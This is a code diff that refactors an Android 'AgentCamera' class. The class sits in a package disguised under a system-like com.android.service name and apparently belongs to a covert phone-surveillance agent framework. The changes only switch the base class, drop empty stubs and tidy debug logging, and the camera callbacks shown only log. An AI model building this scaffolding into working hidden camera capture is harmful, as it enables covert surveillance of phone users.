@@ -18,34 +18,19 @@ import android.hardware.Camera.ShutterCallback;
 import android.view.SurfaceHolder;
 
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAgent;
 import com.android.service.util.Check;
 
 //SNIPPET http://marakana.com/forums/android/examples/39.html
 /**
  * The Class CameraAgent.
  */
-public class AgentCamera extends BaseAgent {
+public class AgentCamera extends BaseInstantAgent {
 
 	private static final String TAG = "AgentCamera"; //$NON-NLS-1$
- //$NON-NLS-1$
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#begin()
-	 */
-	@Override
-	public void begin() {
-		// TODO Auto-generated method stub
 
-	}
-
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
-	 */
 	@Override
-	public void end() {
+	public void actualStart() {
 		// TODO Auto-generated method stub
 
 	}
@@ -56,19 +41,9 @@ public class AgentCamera extends BaseAgent {
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
-	public boolean parse(AgentConf conf) {
+	public boolean parse(ConfAgent conf) {
 		setPeriod(1000);
 		return true;
-	}
-
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
-	 */
-	@Override
-	public void go() {
-		// snapshot();
 	}
 
 	/**
@@ -82,21 +57,21 @@ public class AgentCamera extends BaseAgent {
 
 			public void onShutter() {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " onShutter") ;//$NON-NLS-1$
+					Check.log(TAG + " onShutter");//$NON-NLS-1$
 				}
 			}
 		};
 		final PictureCallback rawCallback = new PictureCallback() {
 			public void onPictureTaken(final byte[] _data, final Camera _camera) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " onPictureTaken RAW") ;//$NON-NLS-1$
+					Check.log(TAG + " onPictureTaken RAW");//$NON-NLS-1$
 				}
 			}
 		};
 		final PictureCallback jpegCallback = new PictureCallback() {
 			public void onPictureTaken(final byte[] _data, final Camera _camera) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " onPictureTaken JPEG") ;//$NON-NLS-1$
+					Check.log(TAG + " onPictureTaken JPEG");//$NON-NLS-1$
 				}
 			}
 		};
